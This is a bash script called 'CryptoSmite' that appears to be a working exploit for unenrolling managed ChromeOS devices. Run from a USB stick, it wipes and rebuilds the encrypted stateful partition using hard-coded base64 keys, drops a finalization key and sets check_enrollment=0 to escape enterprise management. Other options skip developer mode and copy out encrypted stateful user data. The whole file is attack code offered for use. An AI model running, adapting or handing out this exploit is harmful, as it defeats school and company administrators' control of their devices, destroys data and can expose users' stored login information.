#!/bin/bash
#
# cryptosmite.sh remake or something
# by Writable and OlyB
#
# unenroll only for now, will add more features later
#

set -eE
UNENROLL=1
ACTION1="erase"
ACTION2="unenroll"
USE_BACKUP=0
CONTINUE=0
WIPE_ENCSTATEFUL=0
wipe_encstateful() {
	WIPE_ENCSTATEFUL=1
}
echo_sensitive() {
    echo "$@"
}
print_welcome() {
    echo "Welcome to the CryptoSmite toolkit (2024)"
    echo "Please look at the following options: "
    echo "(1) Unenrollment"
	echo "(2) Extract stateful (needed for re-enrollment)"
	echo "(3) Skip Devmode"
	echo "(4) Restore backup (this may or may not re-enroll you, DO NOT TRUST ANY BACKUP THAT YOU FIND ON THE INTERNET, ONLY USE BACKUPS CREATED BY THE REENROLLMENT TOOLKIT)"
	echo "	They may have keyloggers or other extensions installed, and may compromise your login info."
	echo "(5) Wipe current encstateful without removing exploit (This is part of re-enrollment)"
	echo "(q) Quit"
	CONTINUE=1
}
mkdir -p /mnt/stateful_partition
reenroll() {
	# sets unenroll to zero, so it mounts and has same behaviour. This caused problems with the original cryptocrafter script
	UNENROLL=0
	ACTION1="read"
	ACTION2="capture all data on"
	CONTINUE=1
}
skip_devmode() {
	clear
	echo "This will reboot your device, please press ctrl-c within 3 seconds if you have selected the wrong option to quit the program. THIS DOESN'T FEATURE UNENROLLMENT, SELECT OPTION 1."
	mkfs.ext4 /dev/mmcblk0p1 -F
	mount -o loop,rw /dev/mmcblk0p1 /tmp
	touch /tmp/.developer_mode
	umount /tmp && sync
	reboot -f
	exit 0 #if reboot fails for some weird reason
}
restore_backup() {
	USE_BACKUP=1
}
confirm_choice() {
	# Argument 1 is the function/string to confirm. 
	# If the user confirms: The function will decide whether it should reboot, exit, or return to the main menu. 
	# Otherwise exits back to the main menu loop.
	while true
	do
		clear
    local should_run=
		echo "Are you sure you want to $1? (y/n)"
		read -p ">" should_run
    case "$should_run" in
      y)
        $1
        return
        ;;
      n)
        echo "Exiting back to the main menu"
        return
        ;;
      *)
    esac
  done

}
if [ $(id -u) -gt 0 ]
then
    echo "Please run $0 as root"
    exit 0
fi
echo "-------------CryptoSmite------------"
selected_choice=""
while true
do
	if [ $CONTINUE -gt 0 ]
	then
		break
	fi
    # Decided not to refactor unenroll into a bash function, and only add new functions that will get called, and determine if they should exit/reboot. See `confirm_choice`
    clear
    print_welcome
    read -p "Select choice: " -r selected_choice
    case $(echo $selected_choice | awk '{print(tolower($0))}') in
    1)
        # Unenrollment past this point it will just run the code after this
		break
        ;;
    2)
        confirm_choice reenroll
        ;;
    3)
        confirm_choice skip_devmode
        ;;
	4)
		confirm_choice restore_backup
		;;
	5)
		confirm_choice wipe_encstateful
		;;
    q)
        echo "Quitting now"
        sleep 0.8
        clear
        exit 0
        ;;
    *)
        echo "Invalid option"
        ;;
    esac
	 # TO unenroll
done
CRYPTSETUP_PATH=/usr/local/bin/cryptsetup_$(arch)
mount -o rw /dev/sda1 /mnt/stateful_partition
chmod +x /usr/local/bin/cryptsetup_aarch64
chmod +x /usr/local/bin/cryptsetup_x86_64

SCRIPT_DATE="[2024-03-19]"
BACKUP_PAYLOAD=/mnt/stateful_partition/stateful.tar.xz
clear
if [ $USE_BACKUP -gt 0 ]
then
	echo "Please type in your encstateful path below"
	read -p ">" stateful_path
	BACKUP_PAYLOAD=$stateful_path
fi
NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB

fail() {
	printf "%b\n" "$*" >&2
	exit 1
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -l -o name "/dev/$dev_name" 2>/dev/null)" in
				*STATE*KERN-A*ROOT-A*KERN-B*ROOT-B*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

cleanup() {
	umount "$ENCSTATEFUL_MNT" || :
	${CRYPTSETUP_PATH} close encstateful || :
	umount "$STATEFUL_MNT" || :
	trap - EXIT INT
}

key_crosencstateful() {
	cat <<EOF | base64 -d
24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
EOF
}

key_ecryptfs() {
	cat <<EOF | base64 -d
p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
EOF
}

[ -f "$BACKUP_PAYLOAD" ] || fail "$BACKUP_PAYLOAD not found!"

CROS_DEV="$(get_largest_cros_blockdev)"
[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"

TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
[ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"

clear
echo "Welcome to Cryptosmite."
echo "Script date: ${SCRIPT_DATE}"
echo ""

echo "This will ${ACTION1} all data on ${TARGET_PART} and ${ACTION2} the device."
echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
echo "Continue? (y/N)"
read -r action
case "$action" in
	[yY]) : ;;
	*) fail "Abort." ;;
esac


if [ ${UNENROLL} -gt 0 ]
then
	echo_sensitive "Wiping and mounting stateful"
	mkfs.ext4 -F "$TARGET_PART" >/dev/null 2>&1
else
	echo "Not wiping stateful"
fi
STATEFUL_MNT=$(mktemp -d)
mkdir -p "$STATEFUL_MNT"
mount "$TARGET_PART" "$STATEFUL_MNT"


echo_sensitive "Setting up encstateful"
truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block # this keeps data, so we can actually read the old data
ENCSTATEFUL_KEY=$(mktemp)
key_ecryptfs > "$ENCSTATEFUL_KEY"
${CRYPTSETUP_PATH} open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file "$ENCSTATEFUL_KEY" "$STATEFUL_MNT"/encrypted.block encstateful


if [ $UNENROLL -eq 0 ]
then
	echo "Not wiping stateful for extracting of data from stateful"
else
	echo "Wiping and mounting encstateful"
	mkfs.ext4 -F /dev/mapper/encstateful >/dev/null 2>&1
fi
ENCSTATEFUL_MNT=$(mktemp -d)
mkdir -p "$ENCSTATEFUL_MNT"
mount /dev/mapper/encstateful "$ENCSTATEFUL_MNT"


if [ $UNENROLL -eq 0 ]
then
	echo "Backing up data!"
	tar -czf /mnt/stateful_partition/saved.tar.gz $ENCSTATEFUL_MNT
	echo "Successfully extracted encstateful data to /mnt/stateful_partition/saved.tar.gz on the USB! DO NOT SHARE THIS WITH ANYONE that you don't know, as it may contain sensitive information. WE WILL NEVER ASK YOU FOR THIS BACKUP!"
fi

echo_sensitive "Dropping encstateful key"
key_crosencstateful > "$STATEFUL_MNT"/encrypted.needs-finalization
echo $ENCSTATEFUL_KEY > /mnt/stateful_partition/enc.key


if [ $UNENROLL -eq 0 ]
then
	echo "Not restoring backup to encstateful for unenrollment, since the encstateful key has dropped, your next sesson will use the encstateful key (if you used cryptosmite before this without powerwashing)"
	echo ""
else
	if [ $WIPE_ENCSTATEFUL -eq 0 ]
	then
	
		echo_sensitive -n "Extracting backup to encstateful"
		tar -xf "$BACKUP_PAYLOAD" -C "$ENCSTATEFUL_MNT" --checkpoint=.100
		echo ""
	else
		echo "Keeping encstateful empty"
	fi
fi
echo "Cleaning up"
cleanup

vpd -i RW_VPD -s check_enrollment=0 || : # this doesn't get set automatically
crossystem disable_dev_request=1 || :
crossystem disable_dev_request=1 # grunt weirdness
echo "SMITED SUCCESSFULLY!"
echo ""
echo "Exploit and original POC created by Writable (unretained)"
echo "This script created by OlyB"
echo ""
echo "Rebooting in 3 seconds"
sleep 3
reboot -f
echo "If your device hasn't rebooted, press refresh+power."
sleep infinity
